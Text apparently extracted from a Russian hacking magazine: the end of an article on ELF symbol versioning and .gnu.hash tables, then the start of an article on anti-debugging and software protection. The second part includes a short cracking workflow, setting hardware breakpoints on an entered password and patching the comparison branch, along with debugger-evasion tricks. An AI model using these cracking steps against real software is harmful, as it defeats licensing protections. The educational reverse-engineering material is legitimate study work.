Elf64_Vernaux  (Elf32_Vernaux). В этой  струк туре можно увидеть поле
vna_hash, в котором содержится так называемый SysV-хеш от имени зависи-
мости. Следующее поле называется vna_flags, его значение обычно равно
0x0, далее идет поле vna_other, в котором лежит номер версии зависимости
(утилита readelf выводит его с опцией -V).
  Затем следует поле vna_name, содержащее смещение на строку с именем
зависимости в сек ции .dynstr. В завершение этого идет смещение на сле-
дующую порцию дан ных об очеред ной зависимости в текущей  записи.
На рисун ке ниже все это продемонстрировано в схематичном виде (не
забывай, что байты в памяти следуют в обратном поряд ке).





         Содержимое сек ции .gnu.version_r файла example_exit

С прин ципами под счета SysV-хеша можно познакомить ся, посмотрев исходни-
ки  Python-проекта pwntools. Фун кция sysv_hash()  находит ся  в файле
dynelf.py модуля pwnlib. Вообще, этот проект желатель но изу чить поближе
и под робнее, посколь ку в нем собран весь ма неплохой арсенал для иссле-
дования ELF-файлов. Что касается SysV-хеша, то это можно реализовать сле-
дующим образом (разумеется, не забыв при этом установить саму библиотеку
pwntools):


from pwnlib.dynelf import sysv_hash
print ( hex (sysv_hash("GLIBC_2.2.5")))

В сек ции .gnu.version лежат зависимости для каждого сим вола из сек ции .
dynsym. Каждому сим волу из сек ции .dynsym соот ветству ет двухбайтовое зна-
чение из сек ции .gnu.version. При этом указан ное значение совпадает
с полем vna_other из области дан ных записи в сек ции .gnu.version_r,
которая относит ся к этой зависимости.





  Соответствие сим волов из сек ции .dynsym элемен там сек ции .gnu.version
  файла example_exit

Сек ция .gnu.version_d имеется толь ко в динамических библиотеках. Указан -
ная сек ция обеспечивает ассоциацию сим волов с нужными зависимостями.
Элемен ты сек ции определены струк турами Elf64_Verdef  (Elf32_Verdef)
и Elf64_Verdaux (Elf32_Verdaux). По аналогии с .gnu.version_r в первой
струк туре присутству ет поле, содержащее смещение на массив элемен тов,
определен ных второй струк турой.
  При этом дан ный массив, как правило, состоит из одного или двух элемен -
тов с записями о зависимостях. Если в массиве содержатся два элемен та, то
второй обозначает пред ка для зависимости, описан ной в первом элемен те.
Более наг лядно это можно увидеть на следующем рисун ке (для примера
в дан ном слу чае взята библиотека libdl-2.31.so).





         Содержимое сек ции .gnu.version_d файла libdl-2.31.so

В Elf64_Verdef (Elf32_Verdef) можно увидеть:
 • номер версии струк туры записи о зависимостях (поле vd_version с таким
   же, как и в поле vn_version сек ции .gnu.version_r , значением);
 • ин формацию, необходимую для определения версии (поле vd_flags );
 • ин декс (поле vd_ndx , по значению которого определяют зависимости
   для сим волов в сек ции .gnu.version);
 • число  элемен тов  типа Elf64_Verdaux  или Elf32_Verdaux  (поле
  vd_cnt );
 • значение SysV-хеша от строки с именем зависимости (поле vd_hash);
 • смещение   на    начало   массива   элемен тов   Elf64_Verdaux
   или Elf32_Verdaux и смещение на начало следующего элемен та типа
  Elf64_Verdef или Elf32_Verdef.

Поле vd_flags может иметь следующие значения:
 • 0x0 — для версии имеется связан ный с ней сим вол;
 • 0x01 — определение версии для самого файла библиотеки (значение
  VER_FLG_BASE);
 • 0x02 — для версии нет связан ных с ней сим волов (VER_FLG_WEAK).

Элемент типа Elf64_Verdaux (Elf32_Verdaux) содержит смещение на строку
с именем зависимости в сек ции .dynstr и смещение на следующий элемент
типа Elf64_Verdaux (Elf32_Verdaux).
  Значение поля vd_ndx, так же как и поля vna_other из Elf64_Vernaux
(Elf64_Vernaux), определяет нужную зависимость для кон крет ного сим вола
в сек ции .gnu.version.





        Взаимосвязь полей vd_ndx и vna_other с сек цией .gnu.version




                     Более под робно и детально про секции, свя зан-
                     ные  с информа цией  о  зависи мос тях, мож но
                        почитать  в документации  Oracle  и  в  блоге
                     MaskRay.



Ñåêöèÿ .gnu.hash
В этом разделе хранит ся хеш-таблица, которая ускоряет поиск сим волов
для динамического ком поновщика. Так же иног да можно встретить сек цию
с названием .hash. Назначение этой сек ции такое же, однако сек ция .hash —
это так называемая хеш-таблица старого стиля (кстати, в этом слу чае для под -
счета значения хеша от сим вола исполь зует ся уже знакомый нам алгоритм
SysV-хеш).
  В настоящее время таблицы старого стиля встречают ся все реже и реже,
поэтому основное внимание мы сосредоточим на хеш-таблице нового стиля
с исполь зованием так называемого GNU-хеша. Если интересно, о таблице ста-
рого стиля почитай в блоге apenguin.me. С алгорит мом под счета GNU-хеша
можно познакомить ся, покопавшись в исходниках проекта pwntools. Фун кция
gnu_hash(), так же как и sysv_hash(), находит ся в файле dynelf.py модуля
pwnlib.
  Основное отличие нового стиля таблицы от старого — исполь зование
филь тра Блу ма, чтобы определить запись с задан ным хеш-значением.
  Содержимое сек ции .gnu.hash можно пред ставить в виде следующей
струк туры:



    struct gnu_hash_table {
        uint32_t nbuckets;
        uint32_t symbias;
        uint32_t bitmask_nwords;
        uint32_t bloom_shift;
        uint64_t bitmask[bitmask_nwords]; // uint32_t для
32-разрядных ELF-файлов
        uint32_t bucket[nbuckets];
        uint32_t chain[];
    };





         Струк тура сек ции .gnu.hash (для 64-разрядных ELF-файлов)

В заголовке сек ции указывается:
 • nbackets — число так называемых корзин (в общем-то, «корзина» —
   это четырехбайтовая перемен ная, в которой хранит ся значение одного
   из индексов таблицы .dynsym );
 • symbias — число сим волов в .dynsym , для которых не определено
   хеш-значений;
 • bitmask_nwords — число битовых масок в филь тре Блу ма (зависит
   от количества сим волов, для которых значения хешей определены);
 • bloom_shift — счет чик сдвигов, необходимый для работы филь тра Блу -
   ма.




                      Ес ли есть желание озна комиться с ори гинальным
                        алгорит мом  фильтра  Блу ма  непос редс твенно
                       из компоновщика ld.so, то мож но поизу чать его
                      исходни ки   в  час ти,   каса ющей ся  функции
                   do_lookup_x().


После заголовка в сек ции размещается массив битовых масок bitmask, раз-
мерностью, как ты уже догадался, bitmask_nwords. Размер каждой битовой
маски в этом массиве для 64-разрядных ELF-файлов составляет восемь байт,
для 32-разрядных — четыре. После битовых масок филь тра Блу ма идет массив
bucket, размер которого составляет nbuckets, и завершает ся это все мас-
сивом chain.
   Размер этого массива равен числу сим волов, для которых определены зна-
чения хешей (то есть тех, для поиска которых будет применять ся сек ция .gnu.
hash). Элемен тами этого массива являются значения GNU-хешей сим волов.
Весь массив chain делит ся на цепочки, при этом длина цепочек (количество
GNU-хешей сим волов в цепочке) может быть разным. Каждая из этих цепочек
соот ветству ет одному из элемен тов массива bucket, а в элемен те массива
bucket содержится индекс первого сим вола, со значения GNU-хеша которого
начинается соот ветству ющая цепочка в массиве chain. Чтобы определить,
к какому элемен ту массива bucket будет принад лежать тот или иной сим вол
(то есть в какую из цепочек массива chain попадет хеш того или иного сим -
вола), исполь зует ся резуль тат взятия остатка от деления значения GNU-хеша
сим вола на значение nbuckets.
   Для определения кон ца той или иной цепочки значений GNU-хеша исполь -
зует ся последний бит значения этого хеша. Если очеред ной GNU-хеш не явля-
ется последним, то последний бит устанавливается в ноль, независимо от его
реаль ного значения. Если же очеред ной GNU-хеш последний в цепочке, то его
последний бит устанавливается в единицу, опять же независимо от его реаль -
ного значения.
   Для примера заг лянем в сек цию .gnu.hash библиотеки libdl-2.31.so (не
забывая при этом про обратный порядок следования байтов в памяти).





               Сек ция .gnu.hash библиотеки libdl-2.31.so

Из рисун ка вид но, что в сек ции .gnu.hash библиотеки libdl-2.31.so размер
массива backet — 27 элемен тов. При этом видим, что не все элемен ты запол-
нены и их значения равны нулю (заполненные элемен ты выделены красным
цветом). Число сим волов, для которых не определены значения GNU-хешей
(symbias),  равно  28,  число  битовых  масок —  2  (их  значения  равны
0x0400488000110298 и 0x9e08288340200012).
  Количество элемен тов в массиве chain (выделен желтым цветом) равно 15
(то есть сим волов, для которых определены GNU-хеши, тоже 15). При этом
есть одна цепочка из двух элемен тов. Осталь ные цепочки состоят из одного
элемен та (то есть общее количество цепочек — 14, что соот ветству ет количес-
тву заполненных элемен тов массива backet).
   Если сложить значение symbias и число элемен тов массива chain, то дол-
жно получить ся общее число сим волов в сек ции .dynstr. В нашем слу чае
в резуль тате этого арифметического действия получается 42, что соот ветству -
ет числу сим волов сек ции .dynstr в файле libdl-2.31.so.
  Все это работает следующим образом:
 • от сим вола, который нам необходимо найти, вычисляет ся GNU-хеш, после
   чего с помощью филь тра Блу ма проверяется его наличие в массиве chain.
  Филь тр Блу ма может дать ложноположитель ный резуль тат, однако отри-
   цатель ный вердикт однозначно говорит, что хеш искомого сим вола в сек -
   ции .gnu.hash отсутству ет;
 • при отрицатель ном резуль тате работы филь тра поиск по хешам прек раща-
   ем, посколь ку искомый хеш в цепочках массива chain отсутству ет;
 • при положитель ном резуль тате работы филь тра, исходя из резуль тата взя-
   тия  остатка  от  деления  значения GNU-хеша сим вола  на  значение
  nbuckets , определяем, к какому элемен ту массива backet относит ся хеш
   искомого сим вола и, соот ветствен но, в какой цепочке массива chain его
   нужно искать;
 • производит ся поиск хеша искомого сим вола в соот ветству ющей цепочке
   (без учета последнего разряда, посколь ку последний разряд значений
   хешей в цепочке исполь зует ся в качестве признака кон ца цепочки);
 • если в цепочке находит ся хеш, равный хешу искомого сим вола, то исходя
   из значений индекса этого хеша в цепочке номера элемен та массива
  backet , соот ветству ющего этой цепочке, а так же с учетом значения
  symbias, определяется индекс искомого сим вола в сек ции .dynsym ;
 • если в цепочке хеш искомого сим вола отсутству ет, то филь тр Блу ма дал
   ложноположитель ный резуль тат и GNU-хеш искомого сим вола в сек ции .
  gnu.hash отсутству ет.

Прин цип работы хеш-таблиц старого стиля (сек ция с названием .hash),
в общем-то, такой же, за исключением отсутствия филь тра Блу ма и соот ветс-
тву ющих пред варитель ных проверок на наличие или отсутствие нужного хеша.
Если хочешь поэк сперимен тировать с таблицами старого стиля, то можно вос-
поль зовать ся  опцией  ком поновщика  --hash-style=sysv  или  --hash-
style=both (во втором слу чае будут сгенерированы обе таблицы — и старого,
и нового стилей). К примеру, если ском поновать нашу библиотеку из предыду -
щей статьи следующим образом, то увидим в получившемся файле две сек -
ции: .hash и .gnu.hash.


ld --hash-style= both -shared example_lib.o -o libdynamic_example_
hash.so





     Сек ции .hash и .gnu.hash в библиотеке libdynamic_example_hash.so


ÂÛÂÎÄÛ

Сегод ня мы достаточно серь езно пог рузились в глу бины ELF-файлов. Тем
не менее ряд момен тов мы все равно обош ли вниманием. В частности, оста-
лось за кад ром внут реннее устройство сек ций .eh_frame и eh_frame_hdr,
которые организу ют работу с исключениями. Да и в целом было бы неплохо
рассмот реть процессы заг рузки и выполнения ELF-файлов в различных усло-
виях. Поэтому переваривай прочитан ное в сегод няшней статье и жди сле-
дующей. Надеюсь на скорую встречу на завершающем этапе исследования
устройства ELF-файлов.
ВЗЛОМ





                                                                    Крис Касперски
                                                                         Известный российский
                                                                                         хакер. Легенда ][, ex-
                                                                          редактор ВЗЛОМа. Также
                                                                                 известен под
                                                                        псевдонимами мыщъх,
                                                                               nezumi (яп. 鼠, мышь), n2k,
                                                                                             elraton, souriz, tikus, muss,
                                                                                                farah, jardon, KPNC.ЗАТРУДНЯЕМ
АНАЛИЗ
ПРОГРАММ
                                                            Юрий Язев
                                                                    Широко известен под
                                                                       псевдонимом yurembo.
                                                                          Программист, разработчик
                                                                              видеоигр, независимый
                                                                             исследователь. Старый
                                                                           автор журнала «Хакер».
                                                                               yazevsoft@gmail.com





Под хакерством обыч но понима ют изу чение дизассем бли -
рован ного кода при ложений с целью их взло ма. Сегод ня
мы зай мем про тиво положную сто рону бар рикад — изу чим
при емы защиты. Настала пора осно вательно разобраться
в устрой стве используемых хакера ми инстру мен тов, фун -
кци ональной под дер жке со сто роны операци онной сис-
темы и про цессора,  что бы про тивостоять взлом щику,
скрыть свои сек реты и не стать лег кой наживой для зло -
умыш ленни ка!




Пят надцать лет назад эпический труд Криса Касперски «Фун дамен таль ные
основы хакерства» был настоль ной книгой каждого начинающего исследова-
теля в области компь ютерной безопасности. Однако время идет, и знания,
опубликован ные Крисом, теряют акту аль ность. Редак торы «Хакера» попыта-
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
  Ссылки на дру гие статьи из этого цик ла ищи на странице автора.



Три основных этапа взлома защит ных механизмов — это локализация кода
защиты в коде приложения, анализ алгорит ма его работы и собствен но сам
взлом. Все этапы одинаково важны: если, например, не будет пройден второй
из них — за взлом нечего брать ся.
  Можно классифицировать защиты по типу «этапа прет кновения». Например,
шифры и криптозащиты опирают ся на третий этап — алгоритм их работы обыч-
но общедоступен, хорошо докумен тирован и в общем слу чае известен хакеру,
но это не силь но облегчает взлом (разве что упрощает написание перебор-
щика). Механизмы с исполь зованием регистрацион ных номеров, напротив,
делают упор на засек речивании алгорит ма генерации, а так же зат руднении его
поиска и анализа в коде прог раммы (еще бы, зная алгоритм, можно лег ко
написать кейген).
  Од нако даже если защита построена с применением криптографических
методов, скажем шифрует тело критически важных фун кций криптостойким
методом по непомерно длин ному ключу, она может быть «отвязана» от ключа,
например копированием дам па прог раммы после расшифровки. Еще про-
ще — распространять прог рамму вместе с ключом (обычная так тика пиратов).
Один из способов воспрепятствовать такому беспределу — заложить в ключ
зашифрован ную привязку к компь ютеру или проверять «чистоту» копии через
интернет (можно даже и втихомолку — скры то от поль зователя, хотя это счи-
тает ся дурным тоном). Но что помешает хакеру, владеющему лицен зион ной
копией прог раммы, расшифровать ее своим ключом и выкусить все проверки
чего бы там ни было?
   Таким образом, любая защита должна уметь эффективно препятствовать
своему  обнаружению,  анализу,  попут но  отравляя  жизнь  дизассем блеру
и  отладчику — основным  инстру мен там  взлом щика. Без  этого защита
не защита.
  В эпоху царствования MS-DOS в основном исполь зовались прог раммы
реаль ного  режима,  которые  монополь но  распоряжаются  процессором,
памятью и  аппарату рой,  в любой момент беспрепятствен но переходят
в защищен ный режим и возвращают ся обратно. Отладчики в то время (еще
хлипкие, немощные, нежизнеспособные)  лег ко обманывались,  сру бались
и завешивались тривиаль ными приемами прог раммирования, активно исполь -
зуемы ми защитами. Дру гими словами, дизассем блеры тог да были очень глу -
пыми и впадали в сту пор от одного толь ко вида зашифрован ного или самомо-
дифициру ющегося кода. Словом, настоящий рай для разработ чиков защит.
  Сегод ня  все  изменилось.  Прежде  всего,  прик ладной  прог рамме
под Windows особо выделы вать ся ник то не даст. С защищен ным режимом
теперь слиш ком не разгонишь ся — исполь зуй прозаические непривилегиро-
ван ные инструк ции, а о разных хит ростях не помыш ляй. Та же неболь шая часть
защит ных приемов, что может фун кционировать даже в такой ориентирован ной
на поль зователя среде, наталкивается на силь но поум невшие отладчики
и дизассем блеры.
   Аппарат ная под держка отладки в процессорах 386+ в совокупности с вир-
туаль ным режимом работы, привилегирован ными инструк циями и виртуаль ной
памятью позволяет создавать отладчики, которые прак тически не могут быть
обнаружены прик ладной прог раммой, и уж тем более она не в состоянии
получить над ними кон троль.
  Су ществу ют и отладчики-эму ляторы, фак тически настоящие виртуаль ные
машины, самостоятель но исполняющие код, вместо того чтобы пустить его
на «живой» процессор. При этом эму лятор всег да исполняется в режиме
супервизора даже по отношению к отлаживаемому коду нулевого коль ца.
У защиты очень мало шан сов обнаружить отладчик или помешать его работе
(да и то если эму лятор реализован с ошибками).
  Появились и интерак тивные дизассем блеры (та же IDA), которые в силу тес-
ного взаимодействия с поль зователем (в смысле хакером) могут обходить
любые мыслимые и немыслимые ловуш ки, оставлен ные разработ чиком.
  Даже на уровне нулевого коль ца в Windows очень труд но что-либо скрыть.
Чтобы обеспечить совместимость со всем парком Windows-подобных опе-
рационных систем, приходит ся исполь зовать толь ко докумен тирован ные воз-
можности. Строить в «окнах» защиту — все равно что пытать ся заблудить ся
в парке. Будь там хоть миллион деревь ев, все они геомет рически правиль но
расположены и обиль но увешаны табличками «Выход — там».
   Таким образом, надежно противостоять изу чению прог раммы очень труд -
но, если вообще возможно. Однако многие приемы против отладчиков
и дизассем блеров просто интересны сами по себе и достойны того, чтобы
рассмот реть их в этой статье.


ÏÐÈÅÌÛ ÏÐÎÒÈÂ ÎÒËÀÄ×ÈÊÎÂ
Íåìíîãî èñòîðèè
Рань ше всех появился debug.com — пародия, которая отдален но напоминает
отладчик, зато входит в штат ную поставку MS-DOS. Сегод ня этот инстру мент
годит ся разве что для забавы и изу чения ассем блера. Впрочем, и тог да от него
мало кто был в восторге, и новые отладчики росли как грибы после дождя.
Правда, боль шинство из них недалеко ушло от своего прототипа, отличаясь
от оригинала разве что интерфейсом.
  Это было золотое время для разработ чиков защит. Стоило лишь «запереть»
клавиату ру, запретить прерывания, сбросить флаг трассировки, и отладка
прог раммы становилась невозможной.
  Первые мало-маль ски пригод ные для взлома отладчики появились толь ко
после оснащения компь ютеров процессором 80286. В памяти хакеров нав-
сегда останут ся AFD PRO, написан ный в 1987 году AdTec GmbH, знаменитый
Turbo Debugger, созданный годом позже брать ями Крисом и Ричем Виль ямса-
ми, первый эму лиру ющий отладчик Сергея Пачковски, написан ный, правда,
с боль шим опозданием — в 1991  году. Разработ чики защит кряк нули,
но выдержали — эти отладчики по-прежнему позволяли отлаживаемой прог -
рамме захватить над собой кон троль и очень плохо переносили «извращения»
со стеком, экраном, клавиату рой...
  Ситуация изменилась с выходом процессора 80386 — резкое усложнение
прог рам много обеспечения  и, как следствие, огромные сложности с его
отладкой дик товали необходимость наличия развитых отладочных средств
в самом процессоре. И в 386 они появились! С этого момен та разработ чикам
защит стали наступать на пят ки.
  Масла в огонь под лила NuMega, выпустившая в кон це вось мидесятых годов
свой замечатель ный SoftICE, поль зовавшийся у хакеров огромной популяр-
ностью, а позже портирован ный на Windows 9x и Windows NT. Он долгое время
оставался бесспорным фаворитом (хотя не без кон курен ции). Впрочем, невер-
но было бы считать, что NuMega — криминаль ная фирма, а SoftICE исклю-
читель но хакерский продукт. Этот отладчик пред назначен в первую очередь
для разработ чиков драйверов и для легаль ных исследователей операционной
системы (не разбираясь во внут ренностях ОС, с драйверами особо не раз-
гонишь ся).
  Но так или иначе, SoftICE задал копоти всем защитам и их разработ чикам.
Пускай он не был полностью невидимым для отлаживаемых прог рамм Stealth-
отладчиком, имел ряд ошибок, позволяющих себя обнаружить, и давал защите
возможность вырвать ся из-под кон троля, но в умелых руках отладчик справ-
лялся со всеми этими ограничениями и обходил забот ливо расставленные
«капканы». И с каждой версией SoftICE противостоять ему становилось все
труд нее и труд нее (старые ошибки устранялись быстрее, чем вносились
новые).
  Постепен но мода на антиотладочные приемы сош ла на нет и уж совсем
заг лохла под побед ное шествие Windows XP SP3. Посколь ку одновремен но
с ее выходом SoftICE перестал коррек тно работать, полностью завешивая сис-
тему без возможности даль нейшего фун кционирования. Все указывает на то,
что такой же эффект был в Windows Vista, вышед шей годом ранее, но на ней я
самолично SoftICE не проверял.
  К тому момен ту NuMega уже была приобретена ком панией Compuware,
и  SoftICE распространялся  как  часть  пакета для разработ ки драйверов
DriverStudio. Последняя версия SoftICE была выпущена в апреле 2006 года.
Service Pack 3 для Windows XP появился дву мя годами позднее.
   Так как SoftICE исполь зовал недоку мен тирован ные возможности Windows,
с выходом новой версии вин ды он переставал работать. Как было сказано
ранее, после 2006 года SoftICE перестал получать обновления, затем был про-
дан ком пании Micro Focus и ею же окон чатель но похоронен. Вероятно, главную
роль в смерти SoftICE сыг рали деловые разногласия создателей отладчика
с Microsoft, а не технические проблемы, как принято считать. Похоже, SoftICE
исполь зовал какие-то особые механизмы операционной системы, которые
Microsoft посчитала «неудобными».
  При срабаты вании поставлен ной точки останова SoftICE завешивал сис-
тему, позволяя поль зователю (в дан ном слу чае хакеру) продолжать взаимодей-
ствовать с компь ютером через свою прослойку между аппарат ным обес-
печением и ОС. Поэтому после завешивания системы взлом щик мог спокойно
возобновить ее работу, а она, в свою очередь, о зависании даже не подоз-
ревала. У нее даже отставало системное время на тот период, пока она
находилась в «отключке» — в зависшем состоянии.
   Свято место пусто не бывает. В качестве отладчика поль зователь ского
уровня популярным стал OllyDbg. Однако сейчас по дан ным с официаль ного
сайта разработ ка отладчика заморожена.
  Пред приимчивые китайцы выпустили отладчик уровня ядра под названием
Syser, по своим возможностям во многом схожий с испустившим дух SoftICE.
Толь ко энту зиазма хватило ненадолго, и уже совсем скоро разработ ка была
прек ращена. Сейчас его не найти даже на файловых помойках.
  Зато Microsoft с течением времени превратила свой захудалый отладчик
WinDbg в действитель но мощный и полезный для системных прог раммистов
и хакеров инстру мент. Гру бо говоря, WinDbg пред ставляет собой оболочку
для отладки с помощью движка dbgeng.dll, который включен непосредствен -
но в операционную систему. WinDbg может исполь зовать ся как отладчик либо
поль зователь ского режима, либо режима ядра, но не одновремен но.
  Вместе с гибелью SoftICE распространилось совершенно нелепое убеж-
дение, что под Windows на прик ладном уровне дернуть хвост человеку
с отладчиком невозможно. Это вызывает ухмылку профессионалов, эпизоди-
чески встраивающих разные ловуш ки в свои прог раммы —  так, боль ше
для разминки (дабы мозги жиром не заплыли), чем для серь езной борь бы
с хакерами.
  Бороть ся с хакерами при современ ном уровне средств анализа приложе-
ний несколь ко наивно — те и от тиг ра хвост оторвут. Но сегод ня, кроме
хакеров, серь езную угрозу пред ставляют и вчераш ние желторотые поль зовате-
ли, начитавшиеся справочных руководств о том, «как ломать прог раммы» (бла-
го сейчас они доступны всем и каждому), и теперь толь ко и ищу щие, на чем бы
испы тать свою силуш ку богатырскую.


Êàê ðàáîòàåò îòëàä÷èê
Бороть ся с отладчиком, не пред ставляя себе, как он работает, было бы
по мень шей мере некуль турно. Поэтому ниже мы рассмот рим базовые прин -
ципы, лежащие в его основе. Это изложение не является всеобъемлющим, тем
не менее оно позволяет составить общее пред ставление о вопросе. Техничес-
кие под робности исчерпы вающе изложены в 17-й главе Debug, Branch Prole,
Tsc, And Resource Monitoring Features технического руководства Intel 64 and IA-
32 Architectures Software Developer’s Manual, Volume 3B: System Programming
Guide, Part 2 (PDF), которое бесплат но распространяет фирма Intel.
  Все отладчики можно разделить на две категории: первые исполь зуют отла-
дочные средства процессора, а вторые самостоятель но эму лиру ют процессор,
полностью кон тролируя выполнение «подопыт ной» прог раммы.
   Качествен ный эму лиру ющий отладчик отлаживаемый код ни обнаружить,
ни обойти не может, но полноцен ных эму ляторов современ ных Core-процес-
соров на сегод няшний день нет, и вряд ли они появят ся в обозримом
будущем.
  Да и есть ли смысл их создавать? Мик ропроцессоры линейки Core предос-
тавляют в распоряжение разработ чика богатейшие отладочные возможности,
позволяющие кон тролировать даже привилегирован ный код! Они под держи-
вают пошаговое исполнение прог раммы, отслеживают выполнение инструк ции
по задан ному адресу, кон тролиру ют обращения к нужным ячейкам памяти (или
портам ввода-вывода), сиг нализируют о перек лючениях задач и так далее.
  В общей сложности мик ропроцессоры серии x86, начиная с модели x386,
содержат восемь отладочных 32-бит ных регистров. В обновлен ной архитек -
туре x86-64 количество отладочных регистров не изменилось, однако они уве-
личились в размере до 64 бит.
  Четыре отладочных регистра DR0 — DR3 хранят линейные адреса четырех
кон троль ных точек, а управляющий регистр DR7 содержит для каждой из них
условие, при выполнении которого процессор генерирует исключение INT
0x1, передавая управление отладчику. Всего существу ет четыре различных
условия: прерывание при выполнении коман ды, прерывание при модификации
ячейки памяти, прерывание при чтении или модификации, но не исполнении
ячейки памяти и прерывание при обращении к порту ввода-вывода.
  От ладочные регистры для линейных адресов точек останова в зависимости
от архитек туры процессора имеют размеры 32 или 64 бита.
   Регистры DR4 и DR5 зарезервированы для исполь зования в будущем. Флаги
регистра DR6 устанавливаются в зависимости от происходящих исключений.
Например, первые четыре флага устанавливаются в зависимости от срабаты -
вания соот ветству ющих точек останова в регистрах DR0 — DR3. Флаги регистра
DR7 позволяют включать или отключать установленные в регистрах DR0 — DR3
точки останова, а так же определять условия срабаты вания прерываний.





          Регистры отладки в процессорах на архитек туре IA-32





         Регистры отладки в процессорах на архитек туре AMD64




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                  ЗАТРУДНЯЕМ АНАЛИЗ ПРОГРАММ




Если бит трассировки регистра флагов установлен, то после выполнения каж-
дой машин ной инструк ции автоматически генерирует ся отладочное исклю-
чение INT 1 и управление передается отладчику. Отлаживаемый код может
обнаружить трассировку анализом регистра флагов, поэтому для обеспечения
собствен ной невидимости отладчик должен распознавать коман ды чтения
регистра флагов и эму лировать их выполнение, возвращая нулевое значение
флага трассировки.
  Следует обратить внимание на одно важное обстоятель ство: после выпол-
нения коман ды, модифициру ющей значение регистра SS, отладочное исклю-
чение не генерирует ся! Отладчик должен уметь распознавать такую ситу ацию
и самостоятель но устанавливать точку останова на следующую инструк цию.
В противном слу чае войти в процеду ру, пред варен ную инструк цией POP SS,
автоматический трассировщик не сможет:


PUSH SS
POP SS
CALL MySecretProc

Не все современ ные отладчики учитывают эту тон кость, и такой прием, нес-
мотря на свою архаичность, может оказать ся далеко не бесполезным.
   Установкой специаль ного бита можно добить ся генерации отладочного
исключения при всяком обращении к отладочным регистрам, которое возника-
ет даже в том слу чае, если их пытается прочесть (модифицировать) привиле-
гирован ный код. Грамот но спроектирован ный отладчик может скрыть факт
своего присутствия, не позволяя отлаживаемому коду себя обнаружить,
какие бы ни были у него привилегии. Правда, если «подопыт ный» код отла-
живает сам себя, задействовав все четыре кон троль ные точки, отладчик
не сможет работать.
   Если бит Т в TSS отлаживаемой задачи установлен, то при каждом перек -
лючении на нее будет генерировать ся отладочное исключение до выполнения
первой коман ды задачи. Чтобы предот вратить собствен ное обнаружение,
отладчик может отслеживать всякие обращения к TSS и возвращать прог рамме
под ложные дан ные. Необходимо заметить: Windows NT по соображениям про-
изводитель ности не исполь зует TSS (точнее, исполь зует, но всего один) и эта
отладочная возможность для нее совершенно бесполезна.
   Прог рам мная точка останова — единствен ное, что нель зя замаскировать,
не прибегая к написанию полноцен ного эму лятора процессора. Она пред став-
ляет собой однобайтовый код 0xCC, который, если его поместить в начало инс-
трук ции, вызывает исключение INT 0x3 при попыт ке ее выполнения. Отла-
живаемой прог рамме достаточно под считать свою кон троль ную сум му, чтобы
выяснить, была ли установлена хоть одна точка останова или нет. Для дос-
тижения этой цели она может восполь зовать ся коман дами MOV, MOVS, LODS,
POP, CMP, CMPS или любыми дру гими, ни один отладчик не в состоянии их все
отследить и эму лировать.
   Настоятель но рекомен дую исполь зовать прог рам мные точки останова в тех
и толь ко в тех слу чаях, ког да аппарат ных уже не хватает. Как мы увидели выше,
в процессорах x86-64 имеется четыре аппарат ные точки останова. Много
это или мало — зависит от слу чая и отлаживаемой прог раммы. Однако прак -
тически все современ ные отладчики всег да устанавливают прог рам мные, а не
аппарат ные точки останова. Это обстоятель ство может быть с успехом исполь -
зовано в защит ных механизмах, примеры реализаций которых приведены
в разделе «Как противостоять трассировке».


Îáðàáîòêà èñêëþ÷åíèé â ðåàëüíîì è çàùèùåííîì ðåæèìàõ
Ког да возникает отладочное исключение (как, впрочем, и любое дру гое), про-
цессор заносит в стек регистр флагов, адрес следующей (или текущей —
в зависимости от рода исключения) выполняемой инструк ции и лишь затем
передает управление отладчику.
  В реаль ном режиме флаги с адресом возврата заносят ся в стек отлажива-
емой прог раммы, поэтому факт отладки обнаружить очень просто — достаточ-
но кон тролировать целостность содержимого, лежащего выше указателя стека.
Или, как вариант, установить указатель на его вершину, тог да добавление
новых дан ных в стек окажет ся невозможным и отладчик не сможет фун кциони-
ровать.
   Иная ситу ация складывается при работе в защищен ном режиме — обра-
бот чик исключения может находить ся в своем собствен ном адресном прос-
транстве и не исполь зовать никаких ресурсов отлаживаемого приложения,
в том числе и стека. Грамот но спроектирован ный отладчик защищен ного
режима ни обнаружить, ни блокировать прин ципиаль но не может даже при-
вилегирован ный код, исполняющийся в нулевом коль це. Сказан ное справед -
ливо для всех версий Windows семейства NT.


Êàê õàêåðû ëîìàþò ïðîãðàììû?
Вскрыть защит ный механизм в общем слу чае не составляет проблемы. Куда
сложнее найти этот самый механизм в коде ломаемого приложения. Сегод ня
мало кто исполь зует для этой цели автоматическую трассировку — на смену ей
приш ли аппарат ные кон троль ные точки.
   Пусть некая защита запрашивает пароль, затем каким-то образом удос-
товеряется в его под линности (например, сравнивает с оригиналом) и в
зависимости от резуль татов проверки передает управление соот ветству ющей
вет ке прог раммы. Вскрыть такую защиту взлом щик может, даже не вникая
в алгоритм аутен тификации! Он просто введет первый пришед ший ему на ум
пароль (необязатель но совпадающий с правиль ным), найдет его в памяти,
установит кон троль ную точку на первый сим вол строки своего пароля, дож-
дется «всплы тия» отладчика, отследившего обращение к паролю, выйдет
из сравнивающей процеду ры и «под правит» условие перехода так, чтобы
управление всег да получала нужная ветвь прог раммы.
  Время снятия подобных защит измеряет ся секун дами, и обычно такие
прог раммы ломаются рань ше, чем успевают дойти до легаль ного пот ребителя.
К счастью, этому можно противостоять!


Êàê çàùèòèòü ñâîè ïðîãðàììû?
От куда бы ни бралась ключевая информация — из реестра, файла или с кла-
виату ры, взлом щик может прак тически мгновен но локализовать ее местополо-
жение в памяти и установить кон троль ную точку. Помешать этому нель зя,
но не составит тру да под ложить хакеру сюрприз — пусть ключевая информа-
ция не анализирует ся сразу же после получения, а передается в качестве аргу -
мен та множеству фун кций, которые что-то с ней делают и затем передают дру -
гим фун кциям, а те, в свою очередь, следующим.
  Защит ный механизм может быть встроен во что угод но, хоть в процеду ру
откры тия файла или расчета зарплаты. Не стоит делать явных проверок, пусть
лучше в слу чае вызова фун кции с неверной ключевой информацией она воз-
вратит неправиль ный резуль тат, но не сиг нализирует об ошибке. Взломан ная
прог рамма на первый взгляд будет исправно работать, и далеко не сразу
выяснится, что работает она неправиль но (например, выводит на экран одни
числа, а на прин тер — совсем дру гие). А чтобы обезопасить легаль ного поль -
зователя от ошибочного ввода пароля, достаточно в одном месте явно про-
верить его кон троль ную сум му, которая не дает взлом щику никакой информа-
ции об истинном значении пароля.
   Таким образом, защита как бы «размазывается» по всей прог рамме,
